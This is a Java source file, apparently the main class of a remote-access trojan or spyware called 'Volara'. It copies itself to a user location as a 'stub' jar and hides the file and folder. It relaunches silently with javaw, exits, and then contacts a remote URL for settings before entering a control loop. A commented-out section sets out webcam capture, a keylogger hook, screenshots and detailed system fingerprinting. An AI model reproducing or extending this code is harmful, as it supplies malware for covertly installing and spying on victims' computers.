package com.Volara;
import com.sun.jna.platform.win32.Kernel32;

import java.awt.*;
import java.awt.image.RenderedImage;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import javax.imageio.*;


public class Main {

    public static void main(String[] args) throws Exception {
        if (profile.debug == true){
            debug.initDebug();
        }
        //Connection Test: see if we have access to the internet.
        global.connTest(global.connURL);
        //Grab OS Info that is required.
        global.checkOS();
        //Grab Basic Info that is required.
        global.grabGINFO();
        //Grab current Location & Name.
        global.returnAppName();
        global.returnAppPath();
        global.getNewStubLocation();
        global.getNewPercLocation();
        //Move location for the first time.
        if (global.firstStart() == true){
            //Check if profile Location isn't Empty
            if (global.osType_GINFO == "Windows"){

                //Make Libs & first Run file
                try{
                    global.copyDirectory(new File(global.myAppPath + File.separator + global.myAppName), new File(global.prepareLocation + File.separator + profile.fileName_WIN + ".jar"));
                    new File(global.prepareLocation + File.separator + "lib").mkdir();

                    File f = new File(global.prepareLocation + File.separator + "lib" + File.separator + "first.run");
                    f.createNewFile();
                    if (profile.hideFile == true){
                        global.hideFile(new File(global.prepareLocation + File.separator + profile.fileName_WIN + ".jar"));
                        global.hideFile(f);
                        global.hideFolder(global.prepareLocation + File.separator + "lib");
                    }
                    debug.addLine("FIRST RUN: Creating File to Users Location - Windows\n.", Color.orange, 12, false);
                }catch(Exception e){
                    debug.addLine("FIRST RUN: Creating File to Users Location - Windows. - \n" + e.toString(), Color.red, 12, false);
                }
                //Launch Jar
                try {
                    global.currentCommand = "javaw -jar " + global.prepareLocation + File.separator + profile.fileName_WIN + ".jar ";
                    execute myRunner = new execute();
                    Thread myThread = new Thread(myRunner);
                    myThread.start();
                    //Close Ourself
                    System.exit(0);
                }catch(Exception e){
                    debug.addLine("FIRST RUN: Can't launch stub - Windows. - \n" + e.toString(), Color.red, 12, false);
                }
            }else if (global.osType_GINFO == "MacOS"){ //Mac
                //Make Libs & first run file
                try{
                    debug.addLine(global.prepareLocation + File.separator + profile.fileName_Mac + ".jar\n", Color.orange, 12, false);
                    global.copyDirectory(new File(global.myAppPath + File.separator + global.myAppName), new File(global.prepareLocation + File.separator + profile.fileName_Mac + ".jar"));
                    new File(global.prepareLocation + File.separator + "lib").mkdir();
                    File f = new File(global.prepareLocation + File.separator + "lib" + File.separator + "first.run");
                    f.createNewFile();
                    if (profile.hideFile == true){
                        global.hideFile(new File(global.prepareLocation + File.separator + profile.fileName_Mac + ".jar"));
                        global.hideFile(f);
                        global.hideFolder(global.prepareLocation + File.separator + "lib");
                    }
                    debug.addLine("FIRST RUN: Creating File to Users Location - Mac.", Color.orange, 12, false);
                }catch(Exception e){
                    debug.addLine("FIRST RUN: Creating File to Users Location - Mac. - " + e.toString(), Color.red, 12, false);
                }
                try{
                //Launch Jar
                global.currentCommand = "java -jar " + global.prepareLocation + File.separator + profile.fileName_Mac + ".jar";
                execute myRunner = new execute();
                Thread myThread = new Thread(myRunner);
                myThread.start();
                myThread.sleep(30000);
                //Close Ourself
                System.exit(0);
                }catch(Exception e){
                    debug.addLine("FIRST RUN: Can't launch stub - Mac. - \n" + e.toString(), Color.red, 12, false);
                }
            }
        }
        if (global.webConn == true){
            global.getLibSettings(global.libconnURL);
            global.loopStatus = "checkLibs";
        }else{
            global.loopStatus = "notConnected";
        }
        global.startLoop();
        /*
        //INT
        debug.addLine("Init: Core init starting.\n", Color.CYAN, 12, true);
        //Hardware
        if (profile.hardware == true){
            sysInfo.Run();
        }
        //Webcam
        if (profile.webcam == true){
            cam.getWebcams();
            //Webcam
            if (global.noWebcam == false){
                debug.addLine("Found a Webcam: " + global.lstWebcams.get(0) + "\n", Color.ORANGE, 12, false);
                try{
                    Image passedImg = cam.runCustom(global.lstWebcams.get(0));
                    if (passedImg == null){
                        debug.addLine("Cam Nulled."+  "\n", Color.YELLOW, 12, true);
                    }else{
                        ImageIO.write((RenderedImage) passedImg, "GIF", new File("testsave.gif"));
                    }
                }catch(IOException e){
                    debug.addLine("Cam ERROR: "+  e.toString() + "\n", Color.RED, 12, true);
                }
            }
        }
        //Keylog
        if (profile.keylog == true){
            //Keylog
            sysHook.run();
        }
        global.getScreens();
        global.grabGINFO();
        debug.addLine("Init: Core init finished.\n", Color.CYAN, 12, true);
        debug.addLine("GINFO: Application Current user: " + global.userName + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("GINFO: Application System Home-Dir: " + global.homeDir + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("GINFO: Application Current Location: " + global.myAppPath + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("GINFO: Application Current fileName: " + global.myAppName + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("GINFO: Application Connection Status: " + global.webConn + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("GINFO: System No-Webcams: " + global.noWebcam + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("GINFO: System No-Screens: " + global.noScreens + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("GINFO: System Number of Screens: " + global.numScreens + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("GINFO: System Resolution: (" + global.screenWidth + ", " + global.screenHeight  + ")\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Baseboard Model: " + sysInfo.Baseboard_Model + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Baseboard Manufacturer: " + sysInfo.Baseboard_Manufacturer + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Baseboard Version: " + sysInfo.Baseboard_Version + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Baseboard Serial Number: " + sysInfo.Baseboard_SerialNumber + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Model: " + sysInfo.CPU_Model + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Name: " + sysInfo.CPU_Name + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Vendor: " + sysInfo.CPU_Vendor + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Family: " + sysInfo.CPU_Family + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Default Freq: " + sysInfo.CPU_Freq + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Up-Time: " + sysInfo.CPU_UpTime + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Load: " + sysInfo.CPU_Load + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Physical Cores: " + sysInfo.CPU_PhyCores  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Logical Cores: " + sysInfo.CPU_LogCores  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Identifier: " + sysInfo.CPU_Identifier  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU ID: " + sysInfo.CPU_ID  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Stepping: " + sysInfo.CPU_Step   + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Temperature: " + sysInfo.CPU_Temp   + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CPU Voltage: " + sysInfo.CPU_Volt   + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Fans Avg-Speed: " + sysInfo.FAN_Speed   + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CS Model: " + sysInfo.CS_Model   + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CS Manufacturer: " + sysInfo.CS_Manufacturer   + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: CS Serial #: " + sysInfo.CS_SerialNumber   + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Memory Threads: " + sysInfo.MEMORY_Threads   + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Memory Available: " + sysInfo.MEMORY_Available   + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Memory Swap: " + sysInfo.MEMORY_Swap   + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Memory Processes: " + sysInfo.MEMORY_Processes  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Disks: " + sysInfo.numDisks  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Parts: " + sysInfo.numParts  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: OFD: " + sysInfo.fsOFD  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: OFM: " + sysInfo.fsMFD  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: IPv4: " + sysInfo.IPv4  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Host Name: " + sysInfo.hostName + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: DNS Server: " + sysInfo.dnsServer  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: Domain Name: " + sysInfo.domainName  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("SYSINFO: USB Devices: " + sysInfo.numDevices  + "\n", Color.LIGHT_GRAY, 12, false);
        debug.addLine("Init: Operating System: "+ global.checkOS() + "(" + global.osFullname_GINFO + ")\n", Color.WHITE, 12, true);

        //Check OS
        if (global.osType_GINFO == "Windows"){
            debug.addLine("Init: Volara Windows init starting.\n", Color.CYAN, 12, true);
            win.initWin();
            debug.addLine("Init: Volara WINDOWS init finished.\n", Color.CYAN, 12, true);
            debug.addLine("PID: " + Kernel32.INSTANCE.GetCurrentProcessId() + "\n", Color.cyan, 12, false);
        }else if(global.osType_GINFO == "MacOS"){
            debug.addLine("Init: Volara MAC init starting.\n", Color.CYAN, 12, true);
            mac.initMac();
            debug.addLine("Init: Volara MAC init finished.\n", Color.CYAN, 12, true);
            try {
                debug.addLine("PID: " + global.getPid() + "\n", Color.cyan, 12, false);
            } catch (IOException e) {
                debug.addLine("PID: ERROR:" + e.toString() + "\n", Color.RED, 12, false);
            } catch (InterruptedException e) {
                debug.addLine("PID: ERROR:" + e.toString() + "\n", Color.RED, 12, false);
            }
        }

        //Screenshots
        if (global.noScreens == false){
            if (global.numScreens == 1){
                try{
                    ImageIO.write(global.getScreenshot(0), "GIF", new File("monitor.gif"));
                    debug.addLine("Monitor-Screenshot saved! "+ "\n", Color.decode("#98FB98"), 12, true);
                }catch(IOException e){
                    debug.addLine("Monitor-Screenshot ERROR: "+  e.toString() + "\n", Color.RED, 12, true);
                }
            }else{
                try{
                    ImageIO.write(global.getFullScreenshot(), "GIF", new File("monitorFULL.gif"));
                    debug.addLine("Monitor-Screenshot saved! "+ "\n", Color.decode("#98FB98"), 12, true);
                }catch(IOException e){
                    debug.addLine("Full-Screenshot ERROR: "+  e.toString() + "\n", Color.RED, 12, true);
                }
            }
        }*/
    }

}
